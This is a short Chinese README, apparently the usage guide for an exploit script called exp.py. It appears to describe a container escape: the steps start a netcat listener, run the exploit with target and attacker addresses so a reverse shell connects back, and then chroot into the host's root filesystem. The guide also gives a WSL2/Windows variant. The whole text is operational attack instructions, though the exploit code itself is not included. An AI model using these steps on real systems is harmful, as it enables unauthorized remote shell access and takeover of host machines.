# 使用方法:

## 1. 启动监听
```bash
nc -nlvp 60002
```

## 2. 运行 exploit (Linux 宿主机)

```bash
python3 exp.py -t {target-ip} -a {attacker-ip} -p {attacker-port}
```

## 3. 运行 exploit (WSL2/Windows 宿主机)

```bash
python3 exp.py -t {target-ip} -a {attacker-ip} -p {attacker-port} -m /mnt/host/c

## 4. 拿到 shell 后

```bash
cd /host_root
chroot /host_root /bin/bash
```
